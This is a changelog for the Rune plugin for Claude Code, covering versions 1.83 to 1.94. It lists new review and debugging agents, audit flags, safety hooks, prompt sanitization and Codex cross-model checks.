- **`hypothesis-investigator` agent** — ACH-based hypothesis investigation agent for `/rune:debug` skill. Uses structured Analysis of Competing Hypotheses with 4 evidence tiers (DIRECT/CORRELATIONAL/TESTIMONIAL/ABSENCE) and consistency matrix scoring. Model: sonnet, maxTurns: 30.
- **`/rune:debug` skill** — Structured debugging workflow using hypothesis investigation. 4-phase protocol (Observe → Narrow → Hypothesize → Fix) with ACH matrix, reproduction scripts, and fix verification. Integrates with echo-search MCP for past debugging context.
- **Evidence standards in 10 review/investigation agents** — Added structured `confidence_score` (0.0–1.0) and `assumptions` list to finding output format across: flaw-hunter, depth-seer, tide-watcher, void-analyzer, truth-seeker, fringe-watcher, ruin-watcher, ember-seer, signal-watcher, decree-auditor. Enables downstream confidence-aware prioritization.
- **Runebinder confidence/assumption tracking** — Aggregation now preserves per-finding `confidence_score` and `assumptions` from Ash outputs. Tiebreaker rule clarified: confidence-based tiebreaker applies AFTER Ash-priority rule, only when both priority AND hierarchy level are identical.
- **Strive file ownership enforcement** — `validate-strive-worker-paths.sh` hook (SEC-WORK-001) blocks workers from writing files outside their assigned task targets. Documentation clarifies absolute-path security-by-design behavior.

### Fixed
- **Debug skill preprocessor** — Fixed active workflow counter to use `find` with proper JSON content matching instead of fragile `ls | grep` pipeline
- **Debug skill shutdown loop** — Changed Phase 4 shutdown from generic `for each teammate` to explicit `for N in 1..hypothesisCount` with 15-second grace period between shutdown and TeamDelete
- **Strive worker path validator docs** — Added documentation comment explaining absolute-path-outside-CWD denial behavior (security by design)
- **Runebinder tiebreaker rule** — Clarified that confidence-based tiebreaker only applies when both Ash priority AND hierarchy level are already identical

## [1.94.0] - 2026-02-25

### Added
- **`/rune:tarnished` master command** — Intelligent natural-language router and unified entry point for all Rune workflows. Parses user intent (Vietnamese + English), checks prerequisites, and chains multi-step workflows. Common usage: `/rune:tarnished plan ...`, `/rune:tarnished work ...`, `/rune:tarnished review ...`. Handles complex intents like "review and fix", "discuss then plan", and context-aware routing when prerequisites are missing. Includes 3 reference files: intent patterns, workflow chains, and full skill catalog.
- **`axum-reviewer` agent** — Axum/SQLx specialist Ash with 10 named patterns (AXUM-001→010): N+1 query detection, extractor ordering violations, IDOR prevention, input validation on Path params, transaction boundary mismatches, extractor rejection handling, State vs Extension, HandleErrorLayer for fallible Tower middleware, `from_fn_with_state`, and graceful shutdown. Activated when Axum is detected in `Cargo.toml`.
- **`stacks/references/frameworks/axum.md`** — Framework reference doc covering extractor ordering, State vs Extension, SQLx transaction patterns, N+1 prevention, Tower middleware composition, security checklist, and audit commands for all 10 AXUM patterns.
- **RST-011→016 async safety patterns** in `rust-reviewer` — 6 new patterns beyond clippy: timing-unsafe comparison (`==` on secrets), cancel safety in `select!`, Arc cycles without Weak, unbounded channels, RefCell in async context, and `Arc<dyn Trait>` without Send+Sync.
- **Async Safety Patterns section** in `stacks/references/languages/rust.md` — table of 6 async safety patterns with When/Why/Fix columns, plus 6 new audit commands.
- **Axum wiring in stack registry and context router** — `stack-registry.md` Axum row updated to `axum-reviewer (AXUM)` + `SKILL_TO_AGENT_MAP` entry + AXUM in dedup hierarchy after RST. `context-router.md` Step 3 adds `elif fw in ["axum", "actix-web", "rocket"] AND domains.backend` condition (critical fix: without this, axum skill was never loaded).

## [1.93.0] - 2026-02-25

### Changed
- **Skill reference extraction** — Extracted large inline sections from 10 SKILL.md files into dedicated `references/` files. Zero functional changes — content moved verbatim. Total: -1476 lines removed from SKILL.md files, +1955 lines in reference files (39 files changed, 25 new reference files + 14 modified).
  - **Large skills (>500 lines)**:
    - `forge/SKILL.md`: 729 -> 381 lines — Phase 1 -> `references/forge-gaze-selection.md`, Phase 3.5 -> `references/codex-section-validation.md`, Phase 4+5 -> `references/forge-cleanup.md`
    - `mend/SKILL.md`: Phase 5.9 -> `references/todo-update-phase.md`, Phase 3 risk context -> `references/goldmask-mend-context.md`
    - `strive/SKILL.md`: Phase 0.5 -> `references/env-setup.md`, Phase 3.5 codex post-monitor -> `references/codex-post-monitor.md`
    - `arc-hierarchy/SKILL.md`: 542 -> 326 lines — Phase 5 -> `references/session-state.md`, Phase 7 -> `references/main-loop.md`
    - `rune-echoes/SKILL.md`: 478 -> 320 lines — Example Entries -> `references/entry-examples.md`, Codex Echo Validation -> `references/codex-echo-validation.md`, Remembrance -> `references/remembrance-promotion.md`
    - `resolve-all-gh-pr-comments/SKILL.md`: 416 -> 309 lines — Phase 3 -> `references/paginated-fetch.md`, Phase 6 -> `references/batch-process.md`
  - **Shared cross-skill references** (goldmask):
    - `goldmask/references/goldmask-quick-check.md` — shared by forge and mend
    - `goldmask/references/lore-layer-integration.md` — shared by forge, inspect, devise, mend
    - `goldmask/references/risk-tier-sorting.md` — shared by forge and mend
  - **Medium skills (initial references)**:
    - `git-worktree/SKILL.md`: 241 -> 165 lines — `references/worktree-lifecycle.md`, `references/wave-execution.md`
    - `chome-pattern/SKILL.md`: 208 -> 168 lines — `references/canonical-patterns.md`
    - `zsh-compat/SKILL.md`: 261 -> 203 lines — `references/glob-nomatch-patterns.md`

## [1.92.0] - 2026-02-25

### Added
- **Beginner-friendly command aliases** — 3 new commands for the basic daily workflow:
  - `/rune:plan` — alias for `/rune:devise` (plan a feature or task)
  - `/rune:work` — alias for `/rune:strive` (implement a plan)
  - `/rune:review` — alias for `/rune:appraise` (review code changes)
- These commands forward all arguments to their underlying skills, providing simpler naming for new users
- **Getting Started guide** — Beginner-friendly walkthrough of the Plan → Work → Review cycle (EN + VI)
- **README "Getting Started" section** — New section at the top of README for new users with the 3-command workflow

## [1.91.2] - 2026-02-24

### Fixed
- **Nonce propagation in Runebinder spawn prompt** — Explicit nonce injection (3-way redundancy) replaces ambiguous `{session_nonce}` placeholder notation in Phase 5 Runebinder spawn prompt (`orchestration-phases.md`)
- **Todo generation fallback** — Phase 5.4 now generates todo files when TOME findings lack nonce attributes (same-session lenient extraction) or use heading-only format (no RUNE:FINDING markers)
- **Runebinder nonce self-check** — Quality Gates section reinforced with post-write nonce verification step (step 5)
- **Runebinder agent definition** — Session Nonce section synced with prompt template to clarify nonce injection mechanism


## [1.91.1] - 2026-02-24

### Fixed
- **Agent frontmatter format** — Convert all review/testing agent `tools:` from inline string to YAML list format; add `mcpServers: [echo-search]` to all review and testing agents
- **EPERM-safe PID liveness** — `rune_pid_alive()` in `resolve-session-identity.sh` distinguishes ESRCH (dead) from EPERM (alive, different user) for cross-user session isolation
- **Session-stop ownership refactor** — Extract `_get_fm_field()` and `_check_loop_ownership()` helpers in `on-session-stop.sh`, deduplicating batch/hierarchy/issues guard logic (-47 lines)
- **JSON escaping** — Use `jq -Rs` for RFC 8259-compliant JSON escaping in `session-start.sh` (manual fallback preserved)
- **Skill reference links** — Convert backtick reference paths to markdown links in appraise/devise/forge SKILLs
- **Talisman config** — Add `doubt_seer` and `verification` config sections
- **Script hardening** — `umask 077` in session-start.sh, quoting fixes in stamp-team-session.sh, bridge UID validation, timeout fallback

### Added
- Bilingual Rune guides (EN + VI) for code review/audit, work execution, and advanced workflows (6 new docs)

## [1.91.0] - 2026-02-24

### Added
- **Directory-Scoped Audit** — `/rune:audit` gains `--dirs <path,...>` and `--exclude-dirs <path,...>` flags for pre-filtering the Phase 0 `find` command before files reach Rune Gaze, the incremental layer, or the Lore Layer (those components receive a smaller `all_files` array and require zero changes):
  - `--dirs` restricts the audit to comma-separated relative directory paths (overrides talisman `audit.dirs`; talisman value used as fallback)
  - `--exclude-dirs` excludes directories from the scan (merged with talisman `audit.exclude_dirs`; flag values take precedence)
  - Security: `SAFE_PATH_PATTERN` validation, path traversal rejection (`..`), absolute path rejection, symlink guard via `realpath -m` + project-root containment check
  - Robustness: `Array.isArray()` guard on talisman arrays, overlapping dir deduplication (subdirs covered by a parent removed), warn+skip on missing dirs, abort if ALL provided dirs are missing
  - `dirScope` threaded as Parameter Contract #20 to orchestration-phases.md and inscription metadata
  - Talisman config: `audit.dirs` and `audit.exclude_dirs` arrays supported
- **Custom Prompt-Based Audit** — `/rune:audit` gains `--prompt <text>` and `--prompt-file <path>` flags for injecting project-specific instructions into every Ash prompt during an audit session:
  - `--prompt` (inline string) > `--prompt-file` (file path) > `talisman.audit.default_prompt_file` priority chain
  - New Phase 0.5B resolves, validates, loads, and sanitizes the custom prompt block before Rune Gaze
  - `sanitizePromptContent()` strips: YAML frontmatter, HTML/XML comments, null bytes, zero-width chars, BiDi overrides, ANSI escapes, RUNE nonce markers, ANCHOR/RE-ANCHOR lines, reserved Rune headers — `RESERVED_HEADERS` regex declared inside function (prevents `/g` flag reuse bug)
  - Post-sanitization whitespace-only guard aborts with a clear error rather than injecting an empty block
  - Absolute `--prompt-file` paths must be within project root OR `~/.claude/`; relative paths are validated via `SAFE_PROMPT_PATH` pattern
  - Injection point: sanitized block appended to each Ash prompt before the RE-ANCHOR Truthbinding boundary (`customPromptBlock = null` default is CRITICAL — preserves all existing audit calls)
  - Finding attribution: standard prefixes (SEC, BACK, etc.) with `source="custom"` attribute — no CUSTOM- compound prefix
  - `customPromptBlock` threaded as Parameter Contract #21 to orchestration-phases.md
  - Talisman config: `audit.default_prompt_file` string supported
- New reference file: `skills/audit/references/prompt-audit.md` — prompt file format spec, sanitization rules table, HIPAA/OWASP/team-convention examples, edge cases table, finding attribution notes

### Changed
- `audit/SKILL.md`: `argument-hint` updated with `--dirs`, `--exclude-dirs`, `--prompt`, `--prompt-file`
- `audit/SKILL.md`: Flags table expanded with 4 new rows and updated flag interaction notes
- `audit/SKILL.md`: Phase 0 pseudocode split into directory scope resolution block (JS) + scoped `find` command (bash)
- `audit/SKILL.md`: Phase 0.5B added between Lore Layer and Rune Gaze for custom prompt resolution
- `audit/SKILL.md`: Error Handling table extended with 3 new `--prompt-file` error rows
- `orchestration-phases.md`: Parameter Contract table extended with `dirScope` (#20) and `customPromptBlock` (#21)
- `talisman.example.yml`: New `audit.dirs`, `audit.exclude_dirs`, `audit.default_prompt_file` config keys
- `inscription-schema.md`: `dir_scope` and `custom_prompt_block` fields added to inscription metadata schema
- `plugin.json` / `marketplace.json`: Version 1.90.0 → 1.91.0

## [1.90.0] - 2026-02-24

### Added
- **Flow Seer Deep Spec Analysis — 4-Phase Structured Protocol** (v1.90.0) — Transforms the flow-seer agent from an 89-line flat checklist into a 255-line 4-phase structured protocol:
  - **Phase 1 — Deep Flow Analysis**: Maps user journeys with EARS classification (Ubiquitous/State-driven/Event-driven/Optional/Unwanted), optional mermaid diagrams for complex flows (4+ decision points, max 15 nodes)
  - **Phase 2 — Permutation Discovery**: Systematic 7-dimension matrix (User Type, Entry Point, Client/Context, Network, Prior State, Data State, Timing) with NIST pairwise coverage baseline. Configurable cap via `talisman.flow_seer.permutation_cap` (default: 15)
  - **Phase 3 — Gap Identification**: 12-category checklist (Error Handling, State Management, Input Validation, User Feedback, Security, Accessibility, Data Persistence, Timeout/Rate Limiting, Resume/Cancellation, Integration Contracts, Concurrency, i18n) with category relevance filtering and cross-cutting contradiction detection
  - **Phase 4 — Question Formulation**: Prioritized questions (Critical max 5 / Important max 8 / Nice-to-have max 5) with BABOK structured interview pattern, mandatory example scenarios for critical questions
  - **FLOW-NNN finding prefix**: Spec-level findings with 3-digit format, documented as non-dedup (does not participate in `SEC > BACK > ... > CDX` hierarchy)
  - **Second-pass mode**: Auto-detects plan documents (YAML frontmatter with `type:` field), skips Phase 2 for re-validation passes
  - **Pre-Flight Checklist**: 9-point verification before output submission
  - **Phase-level output budgets**: ~180 lines total (40 + 30 + 60 + 50) to prevent context overflow
  - **Executive summary**: Gap count, critical question count, permutation coverage % as first 3 lines
- New reference file: `agents/utility/references/flow-analysis-categories.md` — extracted category tables, permutation dimensions, IEEE 29148 quality mapping, EARS classification guide, BABOK question categories, severity mapping (CRITICAL=P1, HIGH=P2, MEDIUM/LOW=P3)
- Write tool added to flow-seer frontmatter (explicit capability declaration)

### Changed
- `flow-seer.md`: Complete rewrite from 89 lines → 255 lines (4-phase protocol)
- `flow-seer.md`: Description updated with 4-phase protocol keywords for Forge Gaze topic matching
- `flow-seer.md`: Echo integration enhanced with category-specific query patterns (flow, permutation, gap, question)
- `plugin.json` / `marketplace.json`: Version 1.89.0 → 1.90.0

## [1.89.0] - 2026-02-24

### Added
- **Review Agent Gap Closure — 7 Enhancements** — Closes gaps identified from cross-plugin review agent comparison:
  - **Enforcement Asymmetry Protocol** — Shared reference (`agents/review/references/enforcement-asymmetry.md`) enabling variable strictness based on change context (new file vs edit, shared vs isolated). Integrated into simplicity-warden, pattern-seer, and type-warden as proof-of-concept. Security findings always Strict.
  - **Forge-Keeper Data Migration Gatekeeper** — 3 new sections: Production Data Reality Check, Rollback Verification Depth (forward/backward compat matrix), Gatekeeper Verdicts (GATE-001 through GATE-010). GATE findings carry `requires_human_review: true`. New reference: `migration-gatekeeper-patterns.md`. Updated `data-integrity-patterns.md` with dual-write patterns.
  - **Tide-Watcher Frontend Race Conditions** — 3 new sections: Framework-Specific DOM Lifecycle Races (Hotwire/Turbo, React, Vue), Browser API Synchronization, State Machine Enforcement. New reference: `frontend-race-patterns.md`. Updated `async-patterns.md` with WebSocket/SSE patterns.
  - **Schema Drift Detector** — New review agent (`schema-drift-detector.md`) detecting accidental schema drift between migration files and ORM/model definitions across 8 frameworks (Rails, Prisma, Alembic, Django, Knex, TypeORM, Drizzle, Sequelize). DRIFT- prefix findings.
  - **Deployment Verification Agent** — New utility agent (`agents/utility/deployment-verifier.md`) generating deployment artifacts: Go/No-Go checklists, data invariant definitions, SQL verification queries, rollback procedures, and infrastructure-aware monitoring plans. Standalone-only. DEPLOY- prefix.
  - **Agent-Native Parity Reviewer** — New review agent (`agent-parity-reviewer.md`) checking agent-tool parity: orphan features, context starvation, sandbox isolation, workflow tools anti-patterns. PARITY- prefix findings.
  - **Senior Engineer Reviewer** — New review agent (`senior-engineer-reviewer.md`) with persona-based review framework: 5-dimension senior engineer perspective (production thinking, temporal reasoning, team impact, system boundaries, operational readiness). SENIOR- prefix findings. Reference: `persona-review-framework.md`.
- **5 new finding prefixes** registered in dedup-runes.md: GATE-, DRIFT-, DEPLOY-, PARITY-, SENIOR-
- **Talisman config**: New sections for `enforcement_asymmetry`, `schema_drift`, `deployment_verification`

### Changed
- `forge-keeper.md`: Description updated with gatekeeper keywords, sections expanded from 7 to 10 (203 → 274 lines)
- `tide-watcher.md`: Description updated with frontend race keywords, sections expanded from 8 to 11 (adding Framework-Specific DOM Lifecycle Races, Browser API Synchronization, State Machine Enforcement)
- `review-checklist.md`: Pre-Analysis step added for Enforcement Asymmetry
- `data-integrity-patterns.md`: Dual-write migration pattern section added
- `async-patterns.md`: WebSocket/SSE reconnection race patterns added
- `dedup-runes.md`: Standalone prefix table added, reserved standalone prefixes listed
- `agent-registry.md`: Updated counts (34 → 37 review, 10 → 12 utility*, total 79 → 83)
- `plugin.json` / `marketplace.json`: Version 1.88.0 → 1.89.0, agent counts updated

## [1.88.0] - 2026-02-24

### Added
- **PR Bot Review & Comment Resolution** — Two new arc pipeline phases and two standalone skills for automated PR review handling:
  - **Phase 9.1 BOT_REVIEW_WAIT** — Polls for bot reviews (CI, linters, security scanners) with configurable timeout and 3-layer skip gate (CLI → talisman → default off). Non-blocking failure policy.
  - **Phase 9.2 PR_COMMENT_RESOLUTION** — Multi-round review loop that fetches PR comments, applies fixes, replies with explanations, and resolves threads. Hallucination check algorithm rejects invalid fixes. 4 loop exit conditions. Crash recovery with round-aware resume.
  - **`/rune:resolve-gh-pr-comment`** — Standalone skill for resolving a single PR review comment. 10-phase workflow: parse input → fetch comment → detect author → verify code → present analysis → fix/reply/resolve.
  - **`/rune:resolve-all-gh-pr-comments`** — Standalone skill for batch PR comment resolution with pagination support and `updatedAt` tracking.
- **Talisman config**: New `arc.ship.bot_review` section with 10+ configuration keys (enabled, bot_names, timeout, max_rounds, etc.). New timeout entries for `bot_review_wait` and `pr_comment_resolution` in `arc.timeouts`.
- **Arc pipeline expansion**: PHASE_ORDER grows from 21 → 23 phases. PHASE_TIMEOUTS adds `bot_review_wait` (10 min) and `pr_comment_resolution` (15 min). Base budget ~176 → ~201 min. ARC_TOTAL_TIMEOUT_DEFAULT and HARD_CAP updated accordingly.

### Changed
- `arc/SKILL.md`: Description updated (21 → 23 phases), Pipeline Overview expanded, Phase Transition Contracts table (2 new rows), Failure Policy table (2 new rows), Error Handling table (5 new entries), calculateDynamicTimeout includes new phases
- `talisman.example.yml`: Added `bot_review` section under `arc.ship` and timeout entries
- `plugin.json` / `marketplace.json`: Version 1.87.0 → 1.88.0, skill count 31 → 33, skills array updated

## [1.87.1] - 2026-02-24

### Fixed
- **ZSH-001 Check D**: `enforce-zsh-compat.sh` now auto-fixes `\!=` (escaped not-equal) in `[[ ]]` conditions. ZSH rejects `\!=` with "condition expected" while Bash silently accepts the backslash. Auto-fix: strip backslash → `!=`.
- **ZSH-001 Check E**: `enforce-zsh-compat.sh` now auto-fixes unprotected globs in command arguments (not just for-loops). Commands like `rm -rf path/rune-*` cause ZSH NOMATCH fatal errors when no files match — `2>/dev/null` does not help. Auto-fix: prepend `setopt nullglob;`. Detects unquoted globs (strips balanced quotes before checking) for common file commands (rm, ls, cp, mv, cat, wc, head, tail, chmod, chown). Skips if `setopt nullglob` or `shopt -s nullglob` already present.
- **zsh-compat skill**: Added Pitfall 7 (escaped `\!=`) and Pitfall 8 (argument globs) documentation. Updated Quick Reference table with new safe patterns.
- **CLAUDE.md rule #8**: Added escaped `!=` and argument glob guidance. Updated enforcement hook description (3 → 5 checks).

## [1.87.0] - 2026-02-24

### Added
- **Codex Expansion — 10 Cross-Model Integration Points** — Extends inline Codex verification from 9 to 19 total integration points across 7 workflows. All integrations follow the canonical 4-condition detection gate + cascade circuit breaker (5th condition) pattern.
  - **Diff Verification** (2A) — `CDX-VERIFY` findings in `/rune:appraise` Phase 6.2. Codex cross-validates P1 findings from review. Default ON, 300s, high reasoning. ~30% skip rate when no P1/P2 findings.
  - **Test Coverage Critique** (2B) — `CDX-TEST` findings in `/rune:arc` Phase 7.8. Cross-model test adequacy assessment against implementation diff. Default ON, 600s, xhigh reasoning. ~50% skip rate at high coverage.
  - **Release Quality Check** (2C) — `CDX-RELEASE` findings in `/rune:arc` Phase 8.55. CHANGELOG completeness, breaking change detection, migration doc validation. Default ON, 300s, high reasoning. ~60% skip rate.
  - **Section Validation** (3B) — `CDX-SECTION` findings in `/rune:forge` Phase 1.7. Cross-model enrichment quality assessment. Default ON, 300s, medium reasoning. ~40% skip rate.
  - **Research Tiebreaker** (4B) — `[CDX-TIEBREAKER]` inline tag in `/rune:devise` Phase 2.3.5. Resolves conflicting research agent recommendations. Default ON, 300s, high reasoning. ~80% skip rate.
  - **Task Decomposition** (4C) — `CDX-TASK` findings in `/rune:arc` Phase 4.5. Cross-model task granularity and dependency analysis. Default ON, 300s, high reasoning. ~40% skip rate.
  - **Risk Amplification** (3A) — `CDX-RISK` findings in `/rune:goldmask` Phase 3.5. Cross-model risk signal amplification for critical files. Default **OFF**, 600s, xhigh reasoning. ~40% skip rate.
  - **Drift Detection** (3C) — `CDX-INSPECT-DRIFT` findings in `/rune:inspect` Phase 1.5. Cross-model plan-vs-implementation drift analysis. Default **OFF**, 600s, xhigh reasoning. ~50% skip rate.
  - **Architecture Review** (4A) — `CDX-ARCH` findings in `/rune:audit` Phase 6.3. Cross-model architectural pattern review. Default **OFF**, 600s, xhigh reasoning. ~70% skip rate.
  - **Post-monitor Critique** (4D) — `CDX-ARCH-STRIVE` findings in `/rune:strive` Phase 3.7. Cross-model post-completion quality critique. Default **OFF**, 300s, high reasoning. ~30% skip rate.
- **Cascade Failure Circuit Breaker** — `codex_cascade` checkpoint tracking. After 3+ consecutive Codex failures, remaining integrations auto-skip with consolidated warning. AUTH/QUOTA errors trigger immediate cascade. Tracked in arc checkpoint schema v16.
- **Arc Pipeline Phase Expansion** — 3 new phases added to PHASE_ORDER (18 → 21 phases):
  - Phase 4.5 TASK DECOMPOSITION — Codex cross-model task granularity analysis
  - Phase 7.8 TEST COVERAGE CRITIQUE — Codex cross-model test adequacy assessment
  - Phase 8.55 RELEASE QUALITY CHECK — Codex cross-model release artifact validation
- **Greenfield Codex Integration** for Inspect and Goldmask — Full detection infrastructure added to workflows that previously had zero Codex support. Both require "inspect"/"goldmask" added to `codex.workflows` default array.
- **Per-Workflow Codex Budget Caps** — Maximum Codex time and call limits per workflow (e.g., `/rune:arc` 30 min / 10 calls, `/rune:appraise` 10 min / 3 calls)

### Changed
- `arc/SKILL.md`: PHASE_ORDER expanded (18 → 21 phases), PHASE_TIMEOUTS updated (3 new entries + test/pre_ship_validation absorbed), ARC_TOTAL_TIMEOUT_HARD_CAP raised (240 → 285 min), ARC_TOTAL_TIMEOUT_DEFAULT raised (224 → 244 min), checkpoint schema v15 → v16, Phase Transition Contracts table updated (4 new rows), Failure Policy table updated (3 new rows)
- `arc/references/arc-phase-test.md`: Added Phase 7.8 TEST COVERAGE CRITIQUE reference documentation
- `arc/references/arc-phase-pre-ship-validator.md`: Added Phase 8.55 RELEASE QUALITY CHECK reference documentation
- `codex-cli/SKILL.md`: Integration count updated (9 → 19), complete 19-row budget table, per-workflow budget caps, cascade circuit breaker documentation
- `inspect/SKILL.md`: Added `codex-cli` to Load skills, Phase 1.5 Codex Drift Detection section (CDX-INSPECT-DRIFT prefix, independent of Lore Layer, 2000-char injection cap)
- `devise/SKILL.md`: Added Phase 2.3.5 Research Conflict Tiebreaker section (heuristic conflict detection, [CDX-TIEBREAKER] inline tag)
- `goldmask/SKILL.md`: Added Phase 3.5 Codex Risk Amplification section (CDX-RISK prefix, greenfield detection infrastructure)
- `roundtable-circle/SKILL.md`: Added Phase 6.2 Codex Diff Verification section (CDX-VERIFY prefix)
- `forge/SKILL.md`: Added Phase 1.7 Codex Section Validation section (CDX-SECTION prefix)
- `strive/SKILL.md`: Added Phase 3.7 Codex Post-monitor Critique section (CDX-ARCH-STRIVE prefix)
- `audit/SKILL.md`: Added Phase 6.3 Codex Architecture Review section (CDX-ARCH prefix)
- `talisman.example.yml`: Added 10 new Codex feature config keys, `codex_cascade` schema, updated `codex.workflows` defaults
- `plugin.json` / `marketplace.json`: Version 1.86.0 → 1.87.0

### Migration Notes
- **8 new CDX finding prefixes**: CDX-TEST, CDX-RELEASE, CDX-SECTION, CDX-TIEBREAKER, CDX-TASK, CDX-RISK, CDX-INSPECT-DRIFT, CDX-ARCH-STRIVE. CDX-VERIFY and CDX-ARCH are pre-existing. If you have custom Ashes using any of these prefixes, rename them to avoid dedup collisions.
- **No breaking changes**: All 10 integrations follow the canonical detection gate pattern. 6 are default ON (with strong skip conditions), 4 are default OFF (opt-in). Existing workflows without Codex installed are completely unaffected.
- **Arc checkpoint schema v16**: New `codex_cascade` field. Backward-compatible — missing field is treated as no cascade state.

## [1.86.0] - 2026-02-24

### Added
- **Stack-Aware Intelligence System** — 4-layer architecture for technology-specific review quality:
  - **Layer 0: Context Router** (`computeContextManifest()`) — Maps detected domains and stacks to skills, agents, and reference docs for loading
  - **Layer 1: Detection Engine** (`detectStack()`) — Scans manifest files (package.json, pyproject.toml, Cargo.toml, composer.json) for evidence-based stack classification with confidence scoring
  - **Layer 2: Knowledge Skills** — 16+ reference docs organized by language (Python, TypeScript, Rust, PHP), framework (FastAPI, Django, Laravel, SQLAlchemy), database (PostgreSQL, MySQL), library (Pydantic, Returns, Dishka), and pattern (TDD, DDD, DI)
  - **Layer 3: Enforcement Agents** — 11 specialist review agents with unique finding prefixes:
    - Language reviewers: `python-reviewer` (PY), `typescript-reviewer` (TSR), `rust-reviewer` (RST), `php-reviewer` (PHP)
    - Framework reviewers: `fastapi-reviewer` (FAPI), `django-reviewer` (DJG), `laravel-reviewer` (LARV), `sqlalchemy-reviewer` (SQLA)
    - Pattern reviewers: `tdd-compliance-reviewer` (TDD), `ddd-reviewer` (DDD), `di-reviewer` (DI)
  - New skill: `stacks/` with SKILL.md + 3 reference algorithms (detection.md, stack-registry.md, context-router.md) + 16 technology reference docs
  - Rune Gaze Phase 1A: Stack Detection integrated before Ash selection — specialist Ashes added based on detected stack
  - Forge Gaze: Stack affinity bonus scoring for technology-relevant enrichment agents
  - Inscription schema: New `detected_stack`, `context_manifest`, and `specialist_ashes` fields
  - Custom Ashes: New `trigger.languages` and `trigger.frameworks` fields for stack-conditional activation
  - Talisman: `stack_awareness` section (enabled, confidence_threshold, max_stack_ashes) + `forge.stack_affinity_bonus` + 11 new prefixes in `dedup_hierarchy`

### Changed
- `plugin.json` / `marketplace.json`: Version 1.85.0 → 1.86.0, description updated (23 → 34 review agents, 30 → 31 skills)
- `talisman.example.yml`: Added stack_awareness section, dedup_hierarchy updated with 11 stack specialist prefixes, forge.stack_affinity_bonus added
- `CLAUDE.md`: Added stacks skill to Skills table, updated agent count references (23 → 34 review)
- `README.md`: Updated component counts, added 11 stack specialist agents to Review Agents table, added stacks skill to Skills table, updated file tree

### Migration Notes
- **11 new reserved finding prefixes**: PY, TSR, RST, PHP, FAPI, DJG, LARV, SQLA, TDD, DDD, DI. If you have custom Ashes using any of these prefixes in your `talisman.yml`, rename them to avoid dedup collisions. The built-in stack specialist prefixes take priority in the dedup hierarchy.
- **No breaking changes**: Stack detection is opt-out (enabled by default). Set `stack_awareness.enabled: false` in talisman.yml to disable. Existing reviews without detected stacks continue unchanged.

## [1.85.0] - 2026-02-24

### Added
- **Post-Completion Advisory Hook** (`advise-post-completion.sh`) — PreToolUse advisory that detects completed arc pipelines and warns when heavy tools (Write/Edit/Task/TeamCreate) are used in the same session. Debounced once per session via `/tmp` flag file. Fail-open design. Session-isolated via `resolve-session-identity.sh`. Skips when active workflows are running (negative logic per EC-6). Atomic flag creation via `mktemp + mv` (EC-H4).
- **Context Critical Guard Hook** (`guard-context-critical.sh`) — PreToolUse guard that blocks TeamCreate and Task calls when context is at critical levels (default: 25% remaining). Reads statusline bridge file (`/tmp/rune-ctx-{SESSION_ID}.json`). Explore/Plan agents exempt for Task tool only (NOT TeamCreate per EC-4). OS-level UID check (EC-H5). 30-second bridge freshness window (EC-1). Fail-open on missing data. Escape hatches: `/rune:rest`, talisman kill switch, Explore/Plan agents.
- **Required Sections Validation** in `on-teammate-idle.sh` — Inscription-driven quality gate that checks if teammate output contains required section headings specified in `inscription.json`. Advisory only (warns but does not block). Uses `grep -qiF` for fixed-string matching (EC-1). Sanity check: skips if >20 required sections. Truncates warnings to first 5 missing sections.

### Changed
- `hooks/hooks.json`: Added 2 new PreToolUse entries — `advise-post-completion.sh` (matcher: `Write|Edit|NotebookEdit|Task|TeamCreate`) and `guard-context-critical.sh` (matcher: `TeamCreate|Task`)
- `scripts/on-teammate-idle.sh`: Extended with required sections validation after SEAL check (line 161+)

## [1.84.0] - 2026-02-24

### Added
- **Incremental Stateful Audit System** — 3-tier incremental auditing with persistent state, priority scoring, and coverage tracking. Activated via `--incremental` flag. Default `/rune:audit` behavior is completely unchanged (Concern 1: regression safety).
  - **Tier 1 — File-Level**: Codebase manifest generation via batch git plumbing (4 commands instead of N*7 per-file calls), 6-factor composite priority scoring (staleness sigmoid, recency exponential, risk from Lore Layer, complexity, novelty, role heuristic), batch selection with composition rules (20% never-audited minimum, gap carry-forward, always_audit patterns)
  - **Tier 2 — Workflow-Level**: Cross-file workflow discovery via import graph tracing, route-handler chains, convention-based fallback, and manual definitions. Workflow priority scoring with file-change detection and criticality heuristics. WF-* finding prefixes for cross-boundary analysis (DATAFLOW, ERROR, STATE, SEC, CONTRACT, TX, RACE, TRACE, ORDER)
  - **Tier 3 — API-Level**: Multi-framework endpoint discovery (Express, FastAPI, Spring, Go, Rails, Django, Flask, Gin), endpoint type classification with security boosts (GraphQL +3, WebSocket +3, File Upload +2), OWASP API Security Top 10 aligned audit checklist, contract drift detection, cross-tier security feedback (P1 API findings boost file risk scores)
  - **State Persistence**: `.claude/audit-state/` directory with manifest.json, state.json, workflows.json, apis.json, checkpoint.json (crash resume), session history snapshots, and coverage-report.md. TOCTOU-hardened mkdir-based advisory locking. Atomic write protocol (temp-file-then-rename). Schema migration mechanism for forward compatibility.
  - **Coverage Report**: Human-readable dashboard with overall progress, freshness distribution (FRESH/RECENT/STALE/ANCIENT), directory coverage treemap with blind spot detection, top-10 priority unaudited items per tier, session progress log, estimated sessions to target coverage
  - **Session Isolation**: All state files include config_dir, owner_pid, session_id. PID liveness check via `kill -0` with `node` process name verification (Concern 3: Claude Code runs as node)
  - **Warm-Run Optimization**: Stores last_commit_hash in manifest; subsequent runs scan only `git log <cached-hash>..HEAD` (<500ms for 5K-file repos with no new commits)
  - New flags: `--incremental`, `--resume`, `--status`, `--reset`, `--tier <file|workflow|api|all>`, `--force-files <glob>`
  - New reference files: `incremental-state-schema.md`, `codebase-mapper.md`, `priority-scoring.md`, `workflow-discovery.md`, `workflow-audit.md`, `api-discovery.md`, `api-audit.md`, `coverage-report.md`
  - Talisman configuration: `audit.incremental.*` section with batch_size, weights, always_audit, extra_skip_patterns, coverage_target, staleness_window_days, tier-specific settings
  - Git batch metadata uses `--since="1 year"` ceiling by default (Concern 2: not deferred)
  - Extension point contract formalized: Phase 0.1-0.4 insertion with documented input/output types (Concern 5)
  - Migration guide with recovery paths for state corruption (Concern 6)

### Changed
- `audit/SKILL.md`: Added Phase 0.1-0.4 incremental layer (gated behind `--incremental` flag — zero overhead when not set), Phase 7.5 result write-back, expanded error handling table, 8 new reference links
- `talisman.example.yml`: Added `audit.incremental.*` configuration section (commented out, opt-in)

## [1.83.0] - 2026-02-24

### Added
- **`/rune:arc-issues`** — GitHub Issues-driven batch arc execution. Processes GitHub Issues as a work queue: fetches issue content → generates plans → runs `/rune:arc` for each → posts summary comments → closes issues via `Fixes #N` in PR body.
